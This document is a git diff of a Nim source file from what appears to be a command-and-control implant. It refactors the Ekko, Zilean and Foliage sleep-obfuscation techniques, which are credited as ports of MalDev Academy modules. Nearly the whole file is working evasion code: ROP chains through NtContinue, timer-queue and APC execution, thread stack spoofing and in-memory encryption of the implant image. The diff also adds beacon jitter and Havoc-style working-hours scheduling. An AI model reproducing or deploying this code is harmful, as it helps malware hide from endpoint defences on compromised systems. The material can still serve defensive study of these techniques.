@@ -1,15 +1,18 @@
 import winim/lean
 import winim/inc/tlhelp32
-import os, system, strformat
-
-import ./cfg 
+import os, system, random, strformat
+import ../utils/[cfg, io] 
 import ../../common/[types, utils, crypto]
 
-# Different sleep obfuscation techniques, reimplemented in Nim (Ekko, Zilean, Foliage) 
-# The code in this file was taken from the new MalDev Academy modules and translated from C to Nim
-# https://maldevacademy.com/new/modules/54
-# https://maldevacademy.com/new/modules/55
-# https://maldevacademy.com/new/modules/56
+#[
+    Different sleep obfuscation techniques, reimplemented in Nim (Ekko, Zilean, Foliage) 
+    The code in this file was taken from the new MalDev Academy modules and translated from C to Nim
+    
+    References: 
+    - https://maldevacademy.com/new/modules/54
+    - https://maldevacademy.com/new/modules/55
+    - https://maldevacademy.com/new/modules/56
+]#
 
 type 
     USTRING* {.bycopy.} = object 
@@ -95,11 +98,11 @@ proc GetRandomThreadCtx(): CONTEXT =
     # Create snapshot of all available threads
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
     if hSnapshot == INVALID_HANDLE_VALUE: 
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
     defer: CloseHandle(hSnapshot)
 
     if Thread32First(hSnapshot, addr thd32Entry) == FALSE: 
-        raise newException(CatchableError, $GetLastError())
+        raise newException(CatchableError, GetLastError().getError())
         
     while Thread32Next(hSnapshot, addr thd32Entry) != 0: 
         # Check if the thread belongs to the current process but is not the current thread
@@ -115,10 +118,10 @@ proc GetRandomThreadCtx(): CONTEXT =
             if GetThreadContext(hThread, addr ctx) == 0: 
                 continue
 
-            echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
+            print fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
             return ctx 
     
-    echo protect("[-] No suitable thread for stack duplication found.")
+    print "[-] No suitable thread for stack duplication found."
     return ctx  
 
 #[
@@ -144,41 +147,41 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
         # Create timer queue
         status = apis.RtlCreateTimerQueue(addr queue) 
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "RtlCreateTimerQueue " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: discard apis.RtlDeleteTimerQueue(queue)
 
         # Create events
         status = apis.NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventTimer)
 
         status = apis.NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())  
+            raise newException(CatchableError, status.getNtError())  
         defer: CloseHandle(hEventStart)
 
         status = apis.NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventEnd)
 
         # Retrieve the initial thread context
         delay += 100
         status = apis.RtlCreateTimer(queue, addr timer, RtlCaptureContext, addr ctxInit, delay, 0, WT_EXECUTEINTIMERTHREAD)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "RtlCreateTimer/RtlCaptureContext " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         # Wait until RtlCaptureContext is successfully completed to prevent a race condition from forming
         delay += 100
         status = apis.RtlCreateTimer(queue, addr timer, SetEvent, cast[PVOID](hEventTimer), delay, 0, WT_EXECUTEINTIMERTHREAD)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "RtlCreateTimer/SetEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         # Wait for events to finish before continuing 
         status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtWaitForSingleObject " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         if spoofStack: 
             # Stack duplication
@@ -192,7 +195,7 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
         if spoofStack: 
             status = apis.NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
             if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, "NtDuplicateObject " & $status.toHex())
+                raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hThread)
 
         # Preparing the ROP chain 
@@ -278,19 +281,19 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
 
             status = apis.RtlCreateTimer(queue, addr timer, apis.NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
             if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, "RtlCreateTimer/NtContinue " & $status.toHex())
+                raise newException(CatchableError, status.getNtError())
             
-        echo protect("[*] Sleep obfuscation start.")
+        print "[*] Sleep obfuscation start."
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
-        echo protect("[*] Sleep obfuscation end.")
+        print "[*] Sleep obfuscation end."
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print "[-] ", err.msg
 
 
 #[
@@ -316,38 +319,38 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
         # Create events
         status = apis.NtCreateEvent(addr hEventTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventTimer)
 
         status = apis.NtCreateEvent(addr hEventWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventWait)
 
         status = apis.NtCreateEvent(addr hEventStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventStart)    
 
         status = apis.NtCreateEvent(addr hEventEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventEnd)
 
         delay += 100
         status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](RtlCaptureContext), addr ctxInit, delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "RtlRegisterWait/RtlCaptureContext " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         delay += 100
         status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](SetEvent), cast[PVOID](hEventTimer), delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
         if status != STATUS_SUCCESS:
-            raise newException(CatchableError, "RtlRegisterWait/SetEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         # Wait for events to finish before continuing 
         status = NtWaitForSingleObject(hEventTimer, FALSE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtWaitForSingleObject " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         if spoofStack: 
             # Stack duplication
@@ -361,7 +364,7 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
         if spoofStack: 
             status = apis.NtDuplicateObject(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), addr hThread, THREAD_ALL_ACCESS, 0, 0)
             if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, "NtDuplicateObject " & $status.toHex())
+                raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hThread)
 
         # Preparing the ROP chain 
@@ -446,19 +449,19 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
             delay += 100
             status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](apis.NtContinue), addr ctx[i], delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
             if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, "RtlRegisterWait/NtContinue " & $status.toHex())
+                raise newException(CatchableError, status.getNtError())
 
-        echo protect("[*] Sleep obfuscation start.")
+        print "[*] Sleep obfuscation start."
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
-        echo protect("[*] Sleep obfuscation end.")
+        print "[*] Sleep obfuscation end."
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print "[-] ", err.msg
         
 
 #[
@@ -477,20 +480,20 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         # Start synchronization event 
         status = apis.NtCreateEvent(addr hEventSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtCreateEvent " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
         defer: CloseHandle(hEventSync)
             
         # Start suspended thread where the APC calls will be queued and executed
         status = apis.NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtCreateThreadEx " & $status.toHex())
-        echo fmt"[*] [{hThread.repr}] Thread created "
+            raise newException(CatchableError, status.getNtError())
+        print fmt"[*] [{hThread.repr}] Thread created "
         defer: CloseHandle(hThread)
 
         ctxInit.ContextFlags = CONTEXT_FULL
         status = apis.NtGetContextThread(hThread, addr ctxInit)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtGetContextThread " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
         # NtTestAlert is used to check if any user-mode APCs are pending for the calling thread and, if so, execute them.
         # NtTestAlert will trigger all queued APC calls until the last element in the obfuscation chain, where ExitThread is called, terminating the thread.
@@ -545,42 +548,87 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         inc gadget
         
         # ctx[6] contains the final call, which exits the created thread after all APC calls have been executed.
-        ctx[gadget].Rip = cast[DWORD64](ExitThread)
+        ctx[gadget].Rip = cast[DWORD64](winbase.ExitThread)
         ctx[gadget].Rcx = cast[DWORD64](0)
 
         # Queueing the chain 
         for i in 0 .. gadget: 
             status = apis.NtQueueApcThread(hThread, cast[PPS_APC_ROUTINE](apis.NtContinue), addr ctx[i], cast[PVOID](FALSE), NULL)
             if status != STATUS_SUCCESS: 
-                raise newException(CatchableError, "NtQueueApcThread " & $status.toHex())
+                raise newException(CatchableError, status.getNtError())
         
         # Start sleep obfuscation
         status = apis.NtAlertResumeThread(hThread, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtAlertResumeThread " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
 
-        echo protect("[*] Sleep obfuscation start.")
+        print "[*] Sleep obfuscation start."
 
         status = apis.NtSignalAndWaitForSingleObject(hEventSync, hThread, TRUE, NULL)
         if status != STATUS_SUCCESS: 
-            raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
+            raise newException(CatchableError, status.getNtError())
     
-        echo protect("[*] Sleep obfuscation end.")
+        print "[*] Sleep obfuscation end."
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print "[-] ", err.msg
+
+
+# Function to determine whether the agent currently operates within the configured working hours
+proc withinWorkingHours(workingHours: WorkingHours): bool =     
+    var time: SYSTEMTIME
+    GetLocalTime(addr time)
+
+    if int(time.wHour) < workingHours.startHour or int(time.wHour) > workingHours.endHour: 
+        return false 
+
+    if int(time.wHour) == workingHours.startHour and int(time.wMinute) < workingHours.startMinute: 
+        return false 
+
+    if int(time.wHour) == workingHours.endHour and int(time.wMinute) > workingHours.endMinute:
+        return false
+
+    return true 
 
 # Sleep obfuscation implemented in various techniques
-proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NONE, spoofStack: var bool = true) = 
+proc sleepObfuscate*(sleepSettings: SleepSettings) = 
     
-    if sleepDelay == 0: 
+    if sleepSettings.sleepDelay == 0: 
         return 
-    
+
     # Initialize required API functions 
     let apis = initApis() 
 
-    echo fmt"[*] Sleepmask settings: Technique: {$technique}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
+    # Calculate actual sleep delay with jitter
+    let minDelay = float(sleepSettings.sleepDelay) - (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+    let maxDelay = float(sleepSettings.sleepDelay) + (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+    
+    var delay = int(rand(minDelay .. maxDelay) * 1000)
+
+    # Working hours
+    # https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c#L650
+    # If the local time is outside of the agent's working hours, we calculate the required sleep delay until the start of the next work day.
+    if sleepSettings.workingHours.enabled and not withinWorkingHours(sleepSettings.workingHours): 
+        print "[*] Agent is outside of working hours."
+        delay = 0
+
+        # Get current time
+        var time: SYSTEMTIME
+        GetLocalTime(addr time)
+    
+        let minutesSinceMidnight = int(time.wHour) * 60 + int(time.wMinute) 
+        let minutesUntilWorkday = sleepSettings.workingHours.startHour * 60 + sleepSettings.workingHours.startMinute
+
+        if minutesSinceMidnight < minutesUntilWorkday: 
+            # We are on the same day as the start of the work day: calculate the difference between the two timestamps
+            delay = int((minutesUntilWorkday - minutesSinceMidnight) * 60 - int(time.wSecond)) * 1000
+
+        else: 
+            # Calculate minutes until midnight and add the minutes until the start of the workday
+            delay = int(((24 * 60 - minutesSinceMidnight) + minutesUntilWorkday) * 60 - int(time.wSecond)) * 1000
+
+    print fmt"[*] Sleepmask settings: Technique: {$sleepSettings.sleepTechnique}, Delay: {$delay}ms, Stack spoofing: {$sleepSettings.spoofStack}"
 
     var img: USTRING = USTRING(Length: 0)
     var key: USTRING = USTRING(Length: 0)
@@ -596,16 +644,16 @@ proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NON
 
     # Generate random encryption key
     var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
-    key.Buffer = keyBuffer.addr
+    key.Buffer = addr keyBuffer
     key.Length = cast[DWORD](keyBuffer.len())
 
     # Execute sleep obfuscation technique
-    case technique:
+    case sleepSettings.sleepTechnique:
     of EKKO: 
-        sleepEkko(apis, key, img, sleepDelay, spoofStack)
+        sleepEkko(apis, key, img, delay, sleepSettings.spoofStack)
     of ZILEAN: 
-        sleepZilean(apis, key, img, sleepDelay, spoofStack)
+        sleepZilean(apis, key, img, delay, sleepSettings.spoofStack)
     of FOLIAGE:
-        sleepFoliage(apis, key, img, sleepDelay)
+        sleepFoliage(apis, key, img, delay)
     of NONE:
-        sleep(sleepDelay)
+        sleep(delay)
